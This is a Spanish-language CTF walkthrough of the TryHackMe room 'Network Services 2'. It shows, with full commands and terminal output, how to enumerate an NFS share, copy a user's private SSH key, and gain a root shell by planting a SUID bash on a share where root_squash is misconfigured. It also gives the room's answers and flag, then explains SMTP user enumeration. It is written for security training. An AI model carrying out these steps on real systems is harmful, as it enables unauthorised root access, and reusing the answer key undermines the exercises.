---
layout: single
title: Servicios de red 2
excerpt: "Enumeración y explotación de servicios de red y configuraciones erróneas más comunes."
date: 2024-08-19
classes: wide
header:
  teaser: https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red-2/Servicios.png
  teaser_home_page: true
categories:
  - Ciberseguridad
  - TryHackme
tags:
  - Pentesting
  - OSWP
  - TryHackme
---

<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red-2/Portada.png">

Esta sala es una secuela de la primera sala de servicios de red. De manera similar, explotará algunas vulnerabilidades y configuraciones incorrectas más comunes de los servicios de red que probablemente encuentres en los CTF y algunos escenarios de pruebas de penetración.

Te recomiendo que completes la primera sala de [servicios de red]() antes de intentar esta. Al igual que con la sala anterior, definitivamente vale la pena tener un conocimiento básico de Linux antes de intentar esta sala. Si necesita ayuda con esto, intenta completar el módulo ***Conceptos básicos de Linux***:

- [Fundamentos de Linux, Parte 1]()
- [Fundamentos de Linux, Parte 2]()
- [Fundamentos de Linux, Parte 3]()

Conéctate al servidor [OpenVPN]() de TryHackMe; asegúrate de estar sentado cómodamente y ten una taza de té, café o agua cerca. ¡Comencemos!

**N.B.** Esta no es una sala sobre piratería o secuestro de acceso WiFi, sino sobre cómo obtener acceso no autorizado a una máquina mediante la explotación de los servicios de red. Si te interesa hackear redes WiFi, te sugiero que consultes [WiFi Hacking 101]() de NinjaJc01.

¿Listo? ¡Comencemos!

## NFS
NFS (Sistema de archivos de red) y permite que un sistema comparta directorios y archivos con otros a través de una red. Al utilizar NFS, los usuarios y los programas pueden acceder a archivos en sistemas remotos casi como si fueran archivos locales. Esto se logra montando todo o parte de un sistema de archivos en un servidor. Los clientes pueden acceder a la parte del sistema de archivos que se monta con los privilegios que se les asignen a cada archivo.

### ¿Cómo funciona NFS?

<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red-2/NFS.png">

No necesitamos entender el intercambio técnico en demasiado detalle para poder explotar NFS de manera efectiva; sin embargo, si esto es algo que le interesa, le recomendaría este [recurso](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html).

Primero, el cliente solicitará montar un directorio desde un host remoto en un directorio local de la misma manera que puede montar un dispositivo físico. El servicio de montaje actuará entonces para conectarse al demonio de montaje relevante mediante RPC.

El servidor verifica si el usuario tiene permiso para montar cualquier directorio que se haya solicitado. Luego devolverá un identificador de archivo que identifica de manera única cada archivo y directorio que se encuentra en el servidor.

Si alguien desea acceder a un archivo mediante NFS, se realiza una llamada RPC a NFSD (el demonio NFS) en el servidor. Esta llamada toma parámetros como:

- El identificador del archivo
- El nombre del archivo al que se accederá
- El ID de usuario
- El ID de grupo del usuario

Estos se utilizan para determinar los derechos de acceso al archivo especificado. Esto es lo que controla los permisos de usuario, es decir, la lectura y escritura de archivos.

### ¿Qué ejecuta NFS?
Mediante el protocolo NFS, puede transferir archivos entre computadoras que ejecutan Windows y otros sistemas operativos que no son Windows, como Linux, MacOS o UNIX.

Una computadora que ejecuta Windows Server puede actuar como un servidor de archivos NFS para otras computadoras cliente que no sean Windows. Del mismo modo, NFS permite que una computadora basada en Windows que ejecuta Windows Server acceda a archivos almacenados en un servidor NFS que no sea Windows.

### Más información
A continuación, se incluyen algunos recursos que explican la implementación técnica y el funcionamiento de NFS con más detalle del que se ha cubierto aquí:

- [datto.com](https://www.datto.com/blog/what-is-nfs-file-share/)
- [sourceforge.net](https://nfs.sourceforge.net/)
- [archlinux.org](https://wiki.archlinux.org/title/NFS)
- [IBM](https://www.ibm.com/docs/es/aix/7.1?topic=management-network-file-system)
- [Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)

### Responda las preguntas a continuación
- ¿Qué significa NFS? `Network File System`
- ¿Qué proceso permite que un cliente NFS interactúe con un directorio remoto como si fuera un dispositivo físico? `mounting`
- ¿Qué utiliza NFS para representar archivos y directorios en el servidor? `file handle`
- ¿Qué protocolo utiliza NFS para comunicarse entre el servidor y el cliente? `RPC`
- ¿Qué dos datos de usuario toma el servidor NFS como parámetros para controlar los permisos de usuario? (Formato: parámetro1 / parámetro 2) `user id / group id`
- ¿Puede un servidor NFS de Windows compartir archivos con un cliente Linux? (S/N) `Y`
- ¿Puede un servidor NFS de Linux compartir archivos con un cliente MacOS? (S/N) `Y`
- ¿Cuál es la última versión de NFS? [Publicada en 2016, pero aún está actualizada en 2020]; Esto requerirá una investigación externa. `4.2` 

## Enumeración de NFS
Antes de comenzar, asegúrese de implementar la sala y esperar un tiempo para que arranque. Tenga en cuenta que esto puede tardar hasta 5 minutos, así que tenga paciencia.

### ¿Qué es la enumeración?
La enumeración se define como "un proceso que establece una conexión activa con los hosts destino para descubrir posibles vectores de ataque en el sistema, y lo mismo se puede utilizar para una mayor explotación del sistema". - [Infosec Institute](https://www.infosecinstitute.com/resources/penetration-testing/what-is-enumeration/). Es una frase crítica al considerar cómo enumerar y explotar una máquina remota, ya que la información que utilizará para informar sus ataques provendrá de esta etapa.

### Requisitos
Para realizar una enumeración más avanzada del servidor NFS y los recursos compartidos, vamos a necesitar algunas herramientas. La primera de las cuales es clave para interactuar con cualquier recurso compartido NFS desde su máquina local: `nfs-common`

### NFS-Common
Es importante tener eeste paquete instalado en cualquier máquina que use NFS, ya sea como cliente o servidor. Incluye programas como: lockd, statd, showmount, nfsstat, gssd, idmapd y mount.nfs. Principalmente, nos interesan *showmount* y *mount.nfs*, ya que nos serán de gran utilidad a la hora de extraer información del recurso compartido NFS. Si desea más información sobre este paquete, no dude en leer: [packages.ubuntu.com](https://packages.ubuntu.com/jammy/nfs-common).

Puede instalar *nfs-common* utilizando `sudo apt install nfs-common`, es parte de los repositorios predeterminados para la mayoría de las distribuciones de Linux, como Kali Remote Machine o AttackBox, que se proporciona a TryHackMe.

### Escaneo de Puertos
El escaneo de puertos se ha tratado muchas veces antes, por lo que solo se cubrirá los conceptos básicos que necesita para esta sala. Si desea obtener más información sobre nmap con más detalle, eche un vistazo a la sala [nmap](https://tryhackme.com/r/room/furthernmap).

El primer paso de la enumeración es realizar un escaneo de puertos para encontrar la mayor cantidad de información posible sobre los servicios, los puertos abiertos y el sistema operativo de la máquina destino. Puede profundizar tanto como desee en esto, sin embargo, le sugiero que utilice nmap con las etiquetas `-A` y `-p-`.

### Montaje de recursos compartidos NFS
El sistema de su cliente necesita un directorio donde se pueda acceder a todo el contenido compartido por el servidor host en la carpeta de exportación. Puede crear esta carpeta en cualquier parte de su sistema. Una vez que haya creado este punto de montaje, puede utilizar el comando `mount` para conectar el recurso compartido NFS al punto de montaje en su máquina de la siguiente manera:

```text
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```

Desglosemos esto

<table align="center">
    <tr>
        <th>Etiqueta</th>
        <th>Función</th>
    </tr>
    <tr>
        <td>sudo</td>
        <td>Ejecutar como root</td>
    </tr>
    <tr>
        <td>mount</td>
        <td>Ejecutar el comando mount</td>
    </tr>
    <tr>
        <td>-t nfs</td>
        <td>Tipo de dispositivo a montar, luego especificar que es NFS</td>
    </tr>
    <tr>
        <td>IP:Share</td>
        <td>La dirección IP del servidor NFS y el nombre del recurso compartido que deseamos montar.</td>
    </tr>
    <tr>
        <td>-nolock</td>
        <td>Especifica que no se debe usar el bloqueo NLM</td>
    </tr>
</table>

Ahora qye entendemos nuestras herramientas, ¡comencemos!

### Responda las preguntas a continuación
- Realice un escaneo de puertos completos de su elección, ¿cuántos puertos están abiertos? `7`

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ nmap -A -Pn -T4 -p- 10.10.168.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 02:35 EDT
Stats: 0:08:27 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.10.168.144
Host is up (0.21s latency).
Not shown: 65525 closed tcp ports (conn-refused)

PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
    |   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
    |_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)

111/tcp   open     rpcbind  2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  3           2049/udp   nfs
    |   100003  3           2049/udp6  nfs
    |   100003  3,4         2049/tcp   nfs
    |   100003  3,4         2049/tcp6  nfs
    |   100005  1,2,3      42885/tcp   mountd
    |   100005  1,2,3      46337/tcp6  mountd
    |   100005  1,2,3      53966/udp   mountd
    |   100005  1,2,3      55011/udp6  mountd
    |   100021  1,3,4      38893/tcp6  nlockmgr
    |   100021  1,3,4      43575/tcp   nlockmgr
    |   100021  1,3,4      58498/udp   nlockmgr
    |   100021  1,3,4      59038/udp6  nlockmgr
    |   100227  3           2049/tcp   nfs_acl
    |   100227  3           2049/tcp6  nfs_acl
    |   100227  3           2049/udp   nfs_acl
    |_  100227  3           2049/udp6  nfs_acl

2049/tcp  open     nfs      3-4 (RPC #100003)
27117/tcp filtered unknown
31777/tcp filtered unknown
37219/tcp open     mountd   1-3 (RPC #100005)
41431/tcp open     mountd   1-3 (RPC #100005)
42885/tcp open     mountd   1-3 (RPC #100005)
43575/tcp open     nlockmgr 1-4 (RPC #100021)
45347/tcp filtered unknown

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1520.61 seconds
```

- ¿Qué puerto contiene el servicio que buscamos enumerar? `2049`

- Ahora, use `/usr/sbin/showmount -e [IP]` para enumerar los recursos compartidos NFS, ¿cuál es el nombre del recurso compartido visible? `/home`

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ /usr/sbin/showmount -e 10.10.168.144
Export list for 10.10.168.144:
/home *
```

¡Es hora de montar el recurso compartido en nuestra máquina local! primero, use `mkdir /tmp/mount` para crear un directorio en su máquina para montar el recurso compartido. Esta se encuentra en el directorio `/tmp`, así que tenga en cuenta que se eliminará al reiniciar.

- Luego, use el comando `mount` que desglosamos anteriormente para montar el recurso compartido NFS en su máquina local. Cambie el directorio al lugar donde montó el recurso compartido, ¿cuál es el nombre de la carpeta que se encuentra dentro? `cappucino`

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ mkdir /tmp/mount

┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ sudo mount -t nfs 10.10.168.144:/home /tmp/mount/ -nolock
[sudo] password for kali: 

┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ cd /tmp/mount 

┌──(kali㉿kali)-[/tmp/mount]
└─$ ls
cappucino
```

- Eche un vistazo dentro de este directorio, mire los archivos. Parece que estamos dentro del directorio de inicio de un usuario ...

```text
┌──(kali㉿kali)-[/tmp/mount]
└─$ cd cappucino  

┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ ls -la
total 36
drwxr-xr-x 5 kali kali 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Apr 21  2020 ..
-rw------- 1 kali kali    5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali 4096 Apr 22  2020 .cache
drwx------ 3 kali kali 4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwx------ 2 kali kali 4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali    0 Apr 22  2020 .sudo_as_admin_successful
```

- ¡Interesante! Investiguemos un poco ahora, echemos un vistazo a las carpetas. ¿Cuál de estas carpetas podría contener claves que nos darían acceso remoto al servidor? `.ssh`

- ¿Cuál de estas claves nos resulta más útil? `id_rsa`

```text
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ cd .ssh      

┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ ls -la
total 20
drwx------ 2 kali kali 4096 Apr 22  2020 .
drwxr-xr-x 5 kali kali 4096 Jun  4  2020 ..
-rw------- 1 kali kali  399 Apr 22  2020 authorized_keys
-rw------- 1 kali kali 1679 Apr 22  2020 id_rsa
-rw-r--r-- 1 kali kali  399 Apr 22  2020 id_rsa.pub
```

Copia este archivo en una ubicación diferente de tu máquina local y cambia los permisos a "600" usando `chmod 600 [archivo]`.

```text
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ cp id_rsa ~/Desktop/4rlekiing 

┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ cp id_rsa.pub ~/Desktop/4rlekiing 

┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ cd /home/kali/Desktop/4rlekiing 

┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ ls -la
total 48
drwxrwxr-x 2 kali kali 4096 Sep 18 03:30 .
drwxr-xr-x 4 kali kali 4096 Jun  9 02:53 ..
-rw------- 1 kali kali 8328 Sep  5 01:39 4rlekiing.ovpn
-rw-r--r-- 1 kali kali  220 Sep  8 04:55 .bash_logout
-rw-r--r-- 1 kali kali 3771 Sep  8 04:56 .bashrc
-rw-rw-r-- 1 kali kali   26 Apr 24  2020 ftp.txt
-rw------- 1 kali kali 1679 Sep 18 03:30 id_rsa
-rw-r--r-- 1 kali kali  399 Sep 18 03:30 id_rsa.pub
-rw-r--r-- 1 kali kali  807 Sep  8 04:58 .profile
-rw-rw-r-- 1 kali kali  353 Apr 24  2020 PUBLIC_NOTICE.txt

┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ chmod 600 id_rsa
```

Suponiendo que estábamos en lo cierto sobre qué tipo de directorio es este, podemos averiguar fácilmente el nombre del usuario al que corresponde esta clave.

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ cat id_rsa.pub      
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTck1wS7orcud8ViGJKNYxrgrFPhDgpOH243FBoEFgfCdzv7WcWXgUgI+GPPyQsebPzbrAMZT/HjpEmejuXWfRjjLlVM5f+hoalN2aZt9TAZi84+7cWP3as+iq79FwUE1uuep+l9qN6KeQzC1w4sE6lJqTXc/ySbonAHMQu8rDZrYYvg1IzOyRVbo81MqIKDA6YUlPhY6K+SSBcCe5Hg9e39NKQCCk3coMJHVrXEOGQ7z7PES+kM/zWufY8PjSWZ96H/IbrAn2xWWqbWD0hujMcAFpM+HHV3xEOfQLPqBW+w21LqHKoFBrNS047Gt4e6fNGlpuneQBZ/8CjrZ9NH2H cappucino@polonfs
```

- ¿Podemos iniciar sesión en la máquina usando `ssh -i [archivo-de-claves] [nombre-de-usuario]@[IP]`? (S/N) `Y`

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ ssh -i id_rsa cappucino@10.10.168.144
The authenticity of host '10.10.168.144 (10.10.168.144)' can't be established.
ED25519 key fingerprint is SHA256:KJ8GpDRYCTgSot8NqCbqRhNYCUarQAXuwbVuII32x/U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.168.144' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 18 07:34:04 UTC 2024

  System load:  0.0               Processes:           101
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.168.144
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.


Last login: Thu Jun  4 14:37:50 2020
cappucino@polonfs:~$ 
```

## Explotación de NFS
### Hemos terminado, ¿verdad?
No del todo, si tienes una shell con pocos privilegios en cualquier máquina y descubres que una máquina tiene un recurso compartido NFS, es posible que puedas usarlo para aumentar los privilegios, según cómo esté configurado.

### ¿Qué es root_squash?
De forma predeterminada, en los recursos compartidos NFS, Root Squashing está habilitado y evita que cualquier persona que se conecte al recurso compartido NFS tenga acceso de root al volumen NFS. A los usuarios root remotos se les asigna un usuario `nfsnobody` cuando se conectan, que tiene los privilegios locales mínimos. No es lo que queremos. Sin embargo, si está desactivado, puede permitir la creación de archivos de bit SUID, lo que permite que un usuario remoto tenga acceso de root al sistema conectado.

### SUID
Entonces, ¿qué son los archivos con el bit SUID configurado? Básicamente, esto significa que el archivo o los archivos se pueden ejecutar con los permisos del propietario o grupo del archivo. En este caso, como superusuario. ¡Podemos aprovechar esto para obtener un shell con estos privilegios!

### Método
Esto suena complicado, pero en realidad, siempre que esté familiarizado con el funcionamiento de los archivos SUID, es bastante fácil de entender. Podemos cargar archivos en el recurso compartido NFS y controlar los permisos de estos archivos. Podemos establecer los permisos de lo que carguemos, en este caso un ejecutable de shell bash. Luego podemos iniciar sesión a través de SSH, como hicimos en la tarea anterior, y ejecutar este ejecutable para obtener un shell raíz.

### El ejecutable
Por razones de compatibilidad, obtendremos el ejecutable bash directamente desde la máquina objetivo. Con la clave obtenida en la tarea anterior, podemos usar SCP con el comando `scp -i key_name username@10.10.168.144:/bin/bash ~/Downloads/bash` para descargarlo en nuestra máquina atacante.

Otro método para superar los problemas de compatibilidad es obtener un ejecutable bash estándar de Ubuntu Server 18.04, el mismo que el del servidor, como sabemos por nuestro escaneo de nmap. Puede descargarlo [aquí](https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). Si quieres descargarlo a través de la línea de comandos, ten cuidado de no descargar la página de Github en lugar del script original. Puedes usar `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`. Ten en cuenta que este método requiere una conexión a Internet, por lo que no podrás descargarlo si usas una AttackBox gratuita.

### Ruta de acceso planificada
Si esto todavía es difícil de seguir, aquí se muestra un paso a paso de las acciones que estamos realizando y cómo se vinculan todas para permitirnos obtener un shell raíz:

1. Acceso NFS
2. Obtener un shell con privilegios bajos.
3. Cargar un ejecutable de BAsh al recurso compartido NFS
4. Establecer permisos SUID a través de NFS debido a un squash raíz mal configurado.
5. Iniciar sesión a través de SSH
6. Ejecutar ejecutable de BAsh de bit SUID
7. Acceso ROOT

¡Hagámoslo!

### Responde las preguntas a continuación
- Primero, cambia el directorio al punto de montaje en tu máquina, donde el recurso compartido NFS aún debería estar montado, y luego al directorio de inicio del usuario.

- Descarga el ejecutable bash en tu directorio de Descargas. Luego, usa `cp ~/Downloads/bash` para copiar el ejecutable bash en el recurso compartido NFS.

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ scp -i id_rsa cappucino@10.10.168.144:/bin/bash ~/../../tmp/mount/cappucino 
bash                                        100% 1087KB 190.0KB/s   00:05
```

- El shell bash copiado debe ser propiedad de un usuario root, puedes configurarlo usando `sudo chown root bash`

```text
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chown root bash
```

- Ahora, vamos a agregar el permiso del bit SUID al ejecutable bash que acabamos de copiar en el recurso compartido usando `sudo chmod +s bash`. ¿Qué letra usamos para configurar el bit SUID usando chmod? `s`

```text
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chmod +s bash
```

- Hagamos una verificación de cordura, verifiquemos los permisos del ejecutable "bash" usando `ls -la bash`. ¿Cómo se ve el conjunto de permisos? Asegúrate de que termine con (-sr-x). `-rwsr-sr-x`

```text
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ ls -la              
total 1124
drwxr-xr-x 5 kali kali    4096 Sep 18 05:20 .
drwxr-xr-x 3 root root    4096 Apr 21  2020 ..
-rwsr-sr-x 1 root kali 1113504 Sep 18 05:21 bash
-rw------- 1 kali kali     213 Sep 18 05:21 .bash_history
-rw-r--r-- 1 kali kali     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali    3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali    4096 Apr 22  2020 .cache
drwx------ 3 kali kali    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali     807 Apr  4  2018 .profile
drwx------ 2 kali kali    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali       0 Apr 22  2020 .sudo_as_admin_successful
```

- Ahora, ingresa a la máquina por SSH como usuario. Enumere el directorio para asegurarse de que el ejecutable bash esté ahí. Ahora, el momento de la verdad. Ejecutémoslo con `./bash -p`. El (-p) conserva los permisos, de modo que se pueda ejecutar como root con SUID- ya que, de lo contrario, bash a veces anulará los permisos.

```text
┌──(kali㉿kali)-[~/Desktop/4rlekiing]
└─$ ssh -i id_rsa cappucino@10.10.168.144
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 18 09:22:16 UTC 2024

  System load:  0.02              Processes:           101
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 31%               IP address for eth0: 10.10.168.144
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Sep 18 09:11:11 2024 from 10.9.0.115

cappucino@polonfs:~$ ./bash -p
bash-4.4# 
```

- ¡Genial! Si todo ha ido bien, ¡debería tener un shell como root" ¿Cuál es el indicador root? `THM{nfs_got_pwned}`

```text
bash-4.4# ls -la
total 1124
drwxr-xr-x 5 cappucino cappucino    4096 Sep 18 09:20 .
drwxr-xr-x 3 root      root         4096 Apr 21  2020 ..
-rwsr-sr-x 1 root      cappucino 1113504 Sep 18 09:21 bash
-rw------- 1 cappucino cappucino     213 Sep 18 09:21 .bash_history
-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache
drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful

bash-4.4# cd /../

bash-4.4# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz

bash-4.4# cd root

bash-4.4# ls -la
total 40
drwx------  5 root root 4096 Apr 22  2020 .
drwxr-xr-x 24 root root 4096 Jun  4  2020 ..
-rw-------  1 root root    0 Apr 22  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 22  2020 .cache
drwx------  3 root root 4096 Apr 22  2020 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   19 Apr 22  2020 root.txt
drwx------  2 root root 4096 Apr 21  2020 .ssh
-rw-------  1 root root 6124 Apr 22  2020 .viminfo

bash-4.4# cat root.txt
THM{nfs_got_pwned}

bash-4.4# 
```

## Entender SMTP
SMTP (Simple Mail Transfer Protocol) "Protocolo simple de transferencia de correo". Se utiliza para gestionar el envío de correos electrónicos. Para poder ofrecer servicios de correo electrónico, se necesita un par de protocolos, que comprende SMTP y POP/IMAP. Juntos permiten al usuario enviar correos electrónicos salientes y recuperar correos electrónicos entrantes, respectivamente.

El servidor SMTP realiza 3 funciones básicas:
1. Verifica quién está enviando correos electrónicos a través del servidor SMTP.
2. Envía el correo electrónico saliente.
3. Si el correo electrónico saliente no se puede entregar, envía el meensaje de vuelta al remitente.

La mayoría de las personas se habrán encontrado con SMTP al configurar una nueva dirección de correo electrónico en algunos clientes de correo electrónico de terceros, como Thunderbird; al configurar el servidor SMTP para poder enviar correos electrónicos salientes.

### POP e IMAP
POP (Post Office Protocol) e IMAP (Internet Message Acceess Protocol) son ambos protocolos de correo electrónico que se encargan de la transferencia de correo electrónico entre un cliente y un servidor de correo. La principal diferencia radica en el enfoque más simple de POP, que consiste en descargar la bandeja de entrada del servidor de correo al cliente. Mientras qye IMAP sincronizará la bandeja de entrada actual con el correo nuevo en el servidor, descargando todo lo nuevo. Esto significa que los cambios en la bandeja de entrada realizados en un equipo, a través de IMAP, persistirán si luego sincroniza la bandeja de entrada desde otro equipo. El servidor POP/IMAP es responsable de llevar a cabo este proceso.

### ¿Cómo funciona SMTP?
La entrega de correo electrónico funciona de forma muy similar al sistema de entrega de correo físico. El usuario proporcionará el correo electrónico (una carta) y un servicio (servicio de entrega postal) y,  través de una serie de pasos, lo entregará a la bandeja de entrada del destinatario (buzón de correo). El papel del servidor SMTP een este servicio es actuar como oficina de clasificación: el correo electrónico (carta) se recoge y se envía a este servidor, que luego lo dirige al destinatario.

Podemos trazar el recorrido de un correo electrónico desde su computadora hasta la del destinatario de la siguiente manera:

<img align="center" src="https://4rleki-ing.github.io/TryH4ckm3.github.io/assets/images/Servicios-de-Red-2/SMTP.png">

1. El agente de usuario de correo, que puede ser su cliente de correo electrónico o un programa externo, se conecta al servidor SMTP de su dominio, (por ejemplo, smtp.google.com). Esto inicia el protoccolo de enlace SMTP. Esta conexión funciona a través del puerto SMTP, que normalmente es el 25. Una vez qye se han realizado y validades estas conexiones, comienza la sesión SMTP.

2. Ahora puede comenzar el proceso de envío de correo. EL cliente primero envía la dirección de correo electrónico del remitente y del destinatario (el cuerpo del correo electrónico y los archivos adjuntos) al servidor.

3. A continuación, el servidor SMTP comprueba ssi el nombre de dominio del destinatario y del remitente es el mismo.

4. El servidor SMTP del remitente se conectará ak servidor SMTP del destinatario antes de retransmitir el correo electrónico. Si no se puede acceder al servidor del destinatario o no está disponible, el correo electrónico se coloca en ua cola SMTP.

5. A continuación, el servidor SMTP del destinatario verifficará el correo electrónico entrante. Para ello, comprueba si se han reconocido el dominio y el nombre del usuario. A continuación, el servidor reenvía el correo electrónico al servidor POP o IMAP, como se muestra en el diagrama anterior.

6. A continuación, el correo electrónico aparecerá en la bandeja de entrada del destinatario.

Se trata de una versión muy simplificada del proceso y hay muchos subprotocolos, comunicaciones y detalles que no se han incluido. Si desea obtener más información sobre este tema, este es un desglose muy fácil de leer de los detalles técnicos más finos. De hecho, se utilizó para escribir este desgloce:

- [computer.howstuffworks.com](https://computer.howstuffworks.com/e-mail-messaging/email.htm#pt3)

### ¿Qué ejecuta SMTP?
El software del servidor SMTP está disponible en las plataformas de servidor de Windows, y hay muchas otras variantes de SMTP disponibles para ejecutarse en Linux.

### Más Información
Aquí hay un recurso que explica la implementación técnica y el funcionamiento de SMTP con más detalle del que se ha cubierto aquí.

- [afternerd.com](https://www.afternerd.com/blog/smtp/)

### Responda las preguntas a continuación
- ¿Qué significa SMTP? `Simple Mail Transfer Protocol`
- ¿Qué envía SMTP? (responda en plural) `EMAILS`
- ¿Cuál es el primer paso del proceso SMTP? `SMTP handshake`
- ¿Cuál es el puerto SMTP predeterminado? `25`
- ¿A donde envía el servidor SMTP el correo electrónico si el servidor del destinatario no está disponible? `SMTP queue`
- ¿En qué servidor termina finalmente el correo electrónico? `POP/IMAP`
- ¿Puede una máquina Linux ejecutar un servidor SMTP? (Y/N) `Y`
- ¿Puede una máquina Windows ejecutar un servidor SMTP? (Y/N) `Y`

## Enumeración de SMTP
Antes de comenzar, asegúrese de implementar la sala y esperar un tiempo para qye arranque. Tenga en cuenta que esto puede tardar hasta 5 minutos, así que tenga paciencia.

### Enumeración de los detalles del servidor
Los servidores de correo mal configurados o vulnerables a menudo pueden proporcionar un punto de apoyo inicial en una red, pero antes de lanzar un ataque, queremos identificar el servidor para que nuestro objetivo sea lo más preciso posible. Para ello, vamos a utilizar el módulo `smtp_version` de MetaSploit. Como su nombre lo indica, escaneará un rango de direcciones IP y determinará la versión de cualquier servidor de correo que encuentre.

### Enumeración de usuarios desde SMTP
El servicio SMTP tiene 2 comandos internos que permiten la enumeración de usuarios. `VRFY` confirma los nombres de usuarios válidos y `EXPN` que revela la dirección real de los alias de usuario y listas de correo electrónico (listas de correo). USando estos comandos SMTP, podemos revelar una lista de usuarios válidos.

Podemos hacer esto manualmente, a través de una conexión telnet; sin embargo, MetaSploit viene al rescate nuevamente, proporcionando un módulo útil llamado apropiadamente `smtp_enum` que hará el trabajo preliminar por nosotros. Usar el módulo es una simple cuestión de proporcionarle un host o un rango de hosts para escanear y una lista de palabras que contenga los nombres de usuario para enumerar.

### Requisitos
Como vamos a usar Metasploit para esto, es importante que tenga Metasploit instalado. Está instalado de manera predeterminada tanto en Kali Linux como en Parrot OS; sin embargo, siempre vale la pena hacer una actualización rápida para asegurarse de que está en la última versión antes de lanzar cualquier ataque. Puede hacerlo con un simple `sudo apt update` y la actualización correspondiente, si es necesario.

### Alternativas
Vale la pena señalar que esta técnica de enumeración funcionará para la mayoría de las configuraciones SMTP; sin embargo, existen otras herramientas que no son Metasploit, como `smtp-user-enum`, que funcionan incluso mejor para enumerar cuentas de usuario a nivel de SO en Solaris a través del servicio SMTP. La enumeración se realiza inspeccionando las respuestas a los comandos `VRFY`, `EXPN` y `RCPT TO`.

